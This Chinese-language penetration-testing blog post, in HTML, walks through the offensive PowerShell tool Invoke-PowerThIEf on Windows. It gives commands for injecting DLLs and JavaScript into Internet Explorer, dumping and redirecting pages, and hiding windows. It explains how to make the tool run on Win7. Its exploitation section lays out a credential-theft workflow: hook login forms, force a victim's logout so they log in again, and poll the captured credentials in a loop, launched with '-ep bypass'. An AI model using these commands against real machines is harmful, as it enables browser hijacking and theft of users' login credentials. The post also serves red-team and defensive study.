@@ -1,0 +1,404 @@
+I"�B<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>Invoke-PowerThIEf是一个开源的Powershell脚本，不仅能够用来对IE浏览器窗口的内容进行操作，还能通过Hook的方法捕获IE浏览器的凭据。</p>
+
+<p>地址如下：</p>
+
+<p>https://github.com/nettitude/Invoke-PowerThIEf</p>
+
+<p>本文将要对Invoke-PowerThIEf的功能进行测试，分享在Win7 sp1 x64下的使用方法，结合自己的经验，分析利用思路。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>功能测试</li>
+  <li>Win7Sp1下的使用方法</li>
+  <li>利用分析</li>
+</ul>
+
+<h2 id="0x02-功能测试">0x02 功能测试</h2>
+<hr />
+
+<p>Invoke-PowerThIEf需要的环境配置如下：</p>
+
+<ul>
+  <li>IE 11</li>
+  <li>Win 7-10</li>
+  <li>.Net 4.0+</li>
+  <li>Powershell 4.0</li>
+</ul>
+
+<p>考虑到以下原因：</p>
+
+<ul>
+  <li>Window7或Windows Server 2008，默认安装PowerShell 2.0</li>
+  <li>Windows8或Windows server 2012，默认安装PowerShell 3.0</li>
+  <li>Windows 8.1或Windows server 2012 R2，默认安装PowerShell 4.0</li>
+</ul>
+
+<p>首先选择Windows server 2012 R2 x64作为测试环境，可直接运行</p>
+
+<p>常用功能如下：</p>
+
+<h4 id="1列出ie浏览器的所有页面">(1)列出IE浏览器的所有页面</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ListUrls
+</code></pre></div></div>
+
+<h4 id="2在ie进程中加载dll">(2)在IE进程中加载dll</h4>
+
+<p>示例如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ExecPayload -PathPayload calc_x64.dll
+</code></pre></div></div>
+
+<p>默认会在所有页面中执行加载dll的操作，并且会新建新的页面</p>
+
+<p>例如：</p>
+
+<p>如果当前IE进程有3个页面，执行该操作后会执行3次加载dll的操作，并且会在IE浏览器中新建3个页面</p>
+
+<p>个人认为该功能的效果有限</p>
+
+<h4 id="3向ie页面中插入javascript代码并执行">(3)向IE页面中插入JavaScript代码并执行</h4>
+
+<p>针对所有页面：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -Script &lt;JavaScript to run&gt;
+</code></pre></div></div>
+
+<p>针对指定页面：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -BrowserIndex &lt;BrowserIndex&gt; -Script &lt;JavaScript to run&gt;
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;BrowserIndex&gt;</code>可通过ListUrls命令获得</p>
+
+<p>示例如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -Script 'alert(document.location.href);'
+
+Invoke-PowerThIEf -action InvokeJS -BrowserIndex 132572 -Script "alert(`"1`");"
+</code></pre></div></div>
+
+<h4 id="4dump页面内容">(4)Dump页面内容</h4>
+
+<p>针对所有页面：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action DumpHTML
+</code></pre></div></div>
+
+<p>针对指定页面：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action DumpHTML -BrowserIndex &lt;BrowserIndex&gt;
+</code></pre></div></div>
+
+<p>针对指定页面的指定元素：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action DumpHTML -BrowserIndex &lt;BrowserIndex&gt; -SelectorType tag -Selector &lt;type&gt;
+
+Invoke-PowerThIEf -action DumpHTML -BrowserIndex &lt;BrowserIndex&gt; -SelectorType id -Selector &lt;id&gt;
+
+Invoke-PowerThIEf -action DumpHTML -BrowserIndex &lt;BrowserIndex&gt; -SelectorType name -Selector &lt;name&gt;
+</code></pre></div></div>
+
+<h4 id="5隐藏和显示页面">(5)隐藏和显示页面</h4>
+
+<p>隐藏所有页面：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action HideWindow
+</code></pre></div></div>
+
+<p>隐藏指定页面：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action HideWindow -BrowserIndex &lt;BrowserIndex&gt;
+</code></pre></div></div>
+
+<p>显示所有页面：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ShowWindow
+</code></pre></div></div>
+
+<p>显示指定页面：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ShowWindow -BrowserIndex &lt;BrowserIndex&gt;
+</code></pre></div></div>
+
+<p>这里会对页面所在的进程iexploer.exe进行隐藏和显示</p>
+
+<p>例如：</p>
+
+<p>如果进程iexploer1.exe下有两个页面A和B，进程iexploer2.exe下有两个页面C和D，如果隐藏页面A，那么会隐藏进程iexploer1.exe下的所有页面A和B，而iexploer2.exe下有的两个页面C和D不受影响</p>
+
+<h4 id="6页面重定向">(6)页面重定向</h4>
+
+<p>控制页面访问指定的URL</p>
+
+<p>针对所有页面：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Navigate -NavigateUrl &lt;URL&gt;
+</code></pre></div></div>
+
+<p>针对指定页面：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Navigate -BrowserIndex &lt;BrowserIndex&gt; -NavigateUrl &lt;URL&gt;
+</code></pre></div></div>
+
+<h4 id="7捕获凭据">(7)捕获凭据</h4>
+
+<p>这里分为两个步骤：</p>
+
+<p>1.命令执行后，将会Hook所有新打开的页面并记录凭据</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action HookLoginForms 
+</code></pre></div></div>
+
+<p>2.查看已捕获的凭据</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Creds
+</code></pre></div></div>
+
+<h4 id="8新建页面">(8)新建页面</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action NewBackgroundTab
+</code></pre></div></div>
+
+<h2 id="0x03-win7sp1下的使用方法">0x03 Win7Sp1下的使用方法</h2>
+<hr />
+
+<p>这里使用的测试系统为Win7Sp1 x64</p>
+
+<p>Invoke-PowerThIEf直接在Win7sp1下使用会报错，提示如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Unable to find type [System.__ComObject]: make sure that the assembly containin
+g this type is loaded.
+At C:\test\Invoke-PowerThIEf.ps1:151 char:41
++         [OutputType([System.__ComObject] &lt;&lt;&lt;&lt; )]
+    + CategoryInfo          : InvalidOperation: (System.__ComObject:String) []
+   , ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : TypeNotFound
+</code></pre></div></div>
+
+<p>这里需要安装Microsoft .NET Framework 4.5和Windows Management Framework 4.0</p>
+
+<h3 id="1安装microsoft-net-framework-45">1.安装Microsoft .NET Framework 4.5</h3>
+
+<p>命令行下的安装方法可参考之前的文章<a href="https://3gstudent.github.io/渗透基础——命令行下安装Microsoft_.NET_Framework">《渗透基础——命令行下安装Microsoft .NET Framework》</a></p>
+
+<p>实现自动安装的代码可参考：</p>
+
+<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/Install_.Net_Framework_from_the_command_line.cpp</p>
+
+<p>安装后需要等待系统重新启动才能生效</p>
+
+<h3 id="2安装windows-management-framework-40">2.安装Windows Management Framework 4.0</h3>
+
+<p>下载地址：</p>
+
+<p>https://www.microsoft.com/en-us/download/details.aspx?id=40855</p>
+
+<p>命令行下的安装命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wusa.exe Windows6.1-KB2819745-x64-MultiPkg.msu /quiet /norestart
+</code></pre></div></div>
+
+<p>安装成功后进程wusa.exe将会自动退出</p>
+
+<p>同样需要等待系统重启启动才能生效</p>
+
+<p>再次执行Invoke-PowerThIEf</p>
+
+<p>报错提示如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-Type : Could not load file or assembly 'Microsoft.mshtml,
+Version=7.0.3300.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a' or one
+of its dependencies. The system cannot find the file specified.
+At C:\test\Invoke-PowerThIEf.ps1:362 char:13
++             Add-Type -TypeDefinition $source -Language CSharp
+-ReferencedAssembl ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
+    + CategoryInfo          : NotSpecified: (:) [Add-Type], FileNotFoundExcept
+   ion
+    + FullyQualifiedErrorId : System.IO.FileNotFoundException,Microsoft.PowerS
+   hell.Commands.AddTypeCommand
+</code></pre></div></div>
+
+<p>错误的原因是代码中使用了：<code class="language-plaintext highlighter-rouge">using mshtml;</code> ，缺少这个引用文件</p>
+
+<p>Invoke-PowerThIEf在Server2012R2下能够正常使用，于是我尝试比较Server2012R2和Win7系统的差异，看看能否通过替换文件的方式解决这个问题</p>
+
+<h3 id="解决方法1">解决方法1</h3>
+
+<p>参考资料：</p>
+
+<p>https://www.crifan.com/microsoft_html_object_library_mshtml_tlb_in_com_vs_microsoft_mshtml_microsoft_mshtml_dll_in_dotnet/</p>
+
+<p>在安装VS2015的Server2012R2下尝试导出mshtml.dll，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Program Files (x86)\Microsoft SDKs\Windows\v7.0A\Bin\x64\tlbimp.exe C:\Windows\System32\mshtml.tlb /out:c:\test\mshtml.dll
+</code></pre></div></div>
+
+<p>获得mshtml.dll</p>
+
+<p>将mshtml.dll放在Invoke-PowerThIEf的同级目录下，重命名为Microsoft.mshtml.dll</p>
+
+<p>执行后依旧是同样的错误，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-11/2-1.png" alt="Alt text" /></p>
+
+<p>该方法失败</p>
+
+<h3 id="解决方法2">解决方法2</h3>
+
+<p>经过对比，发现Server2012R2比Win7系统多了文件夹：<code class="language-plaintext highlighter-rouge">C:\Windows\assembly\GAC\Microsoft.mshtml</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-11/2-2.png" alt="Alt text" /></p>
+
+<p>具体多出以下文件：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\assembly\GAC&gt;tree Microsoft.mshtml /f
+Folder PATH listing
+Volume serial number is F4B2-E12B
+C:\WINDOWS\ASSEMBLY\GAC\MICROSOFT.MSHTML
+└───7.0.3300.0__b03f5f7f11d50a3a
+        Microsoft.mshtml.dll
+        __AssemblyInfo__.ini
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>C:\Windows\assembly下文件夹的具体内容只能通过命令行进行查看，无法在Explorer中查看</p>
+
+<p>于是尝试将Server2012R2系统中C:\Windows\assembly\GAC\Microsoft.mshtml的所有内容复制到Win7下面</p>
+
+<p>我已经将C:\Windows\assembly\GAC\Microsoft.mshtml的所有内容提取出来并上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Invoke-PowerThIEf/tree/master/Microsoft.mshtml</p>
+
+<p>在Win7系统的命令行下执行：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xcopy Microsoft.mshtml C:\Windows\assembly\GAC\Microsoft.mshtml /i /s /e
+</code></pre></div></div>
+
+<p>再次执行Invoke-PowerThIEf，运行成功，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-11/2-3.png" alt="Alt text" /></p>
+
+<h2 id="0x04-利用分析">0x04 利用分析</h2>
+<hr />
+
+<p>Invoke-PowerThIEf的利用场景主要有以下3个：</p>
+
+<h3 id="1控制ie浏览器访问指定页面并获得网页内容">1.控制IE浏览器访问指定页面并获得网页内容</h3>
+
+<h4 id="1创建一个新页面">(1)创建一个新页面</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action NewBackgroundTab
+</code></pre></div></div>
+
+<h4 id="2获得新页面的序号">(2)获得新页面的序号</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ListUrls
+</code></pre></div></div>
+
+<p>假设这里的序号为132572</p>
+
+<h4 id="3将其重定向到指定url">(3)将其重定向到指定URL</h4>
+
+<p>这里以<code class="language-plaintext highlighter-rouge">https://www.shodan.io/</code>为例</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Navigate -BrowserIndex 132572 -NavigateUrl https://www.shodan.io/
+</code></pre></div></div>
+
+<h4 id="4抓取页面结果">(4)抓取页面结果</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action DumpHTML -BrowserIndex 132572
+</code></pre></div></div>
+
+<h4 id="5关闭此页面">(5)关闭此页面</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -BrowserIndex 132572 -Script "window.opener=null;window.open('','_self');window.close();"
+</code></pre></div></div>
+
+<h4 id="补充重定向到空白页面">补充：重定向到空白页面</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Navigate -BrowserIndex 132572 -NavigateUrl about:blank
+</code></pre></div></div>
+
+<h3 id="2抓取凭据">2.抓取凭据</h3>
+
+<h4 id="1列出所有标签">(1)列出所有标签</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ListUrls
+</code></pre></div></div>
+
+<p>发现后台有shodan的登录页面</p>
+
+<h4 id="2开启抓取凭据的功能">(2)开启抓取凭据的功能</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action HookLoginForms
+</code></pre></div></div>
+
+<h4 id="3强制shodan账号退出登录状态">(3)强制shodan账号退出登录状态</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -BrowserIndex 525660 -Script "window.location.href = 'https://account.shodan.io/logout';"
+</code></pre></div></div>
+
+<p>等待用户重新登录</p>
+
+<h4 id="4查看抓取到的凭据">(4)查看抓取到的凭据</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Creds 
+</code></pre></div></div>
+
+<p>这里需要注意，执行完步骤2后不能退出Powershell进程，否则无法抓取到新的凭据</p>
+
+<p>如果想要自动实现以上功能，这里可以通过加循环的方法实现每隔10秒在后台抓取凭据，使用的Powershell命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action HookLoginForms
+while(1)
+{
+    Start-Sleep –s 10
+    Write-host "[*] Sleep 10 seconds"
+    Invoke-PowerThIEf -action Creds
+}
+</code></pre></div></div>
+
+<p>执行脚本：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -ep bypass -f Invoke-PowerThIEf.ps1
+</code></pre></div></div>
+
+<h3 id="3修改页面内容执行javascript代码">3.修改页面内容，执行JavaScript代码</h3>
+
+<p>针对所有页面：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -Script &lt;JavaScript to run&gt;
+</code></pre></div></div>
+
+<p>针对指定页面：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -BrowserIndex &lt;BrowserIndex&gt; -Script &lt;JavaScript to run&gt;
+</code></pre></div></div>
+
+<p>要实现的功能取决于具体的JavaScript代码</p>
+
+<h2 id="0x05-小结">0x05 小结</h2>
+<hr />
+
+<p>本文介绍了Invoke-PowerThIEf支持的功能，分享在Win7 sp1 x64下的使用方法，结合自己的经验，分析利用思路。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
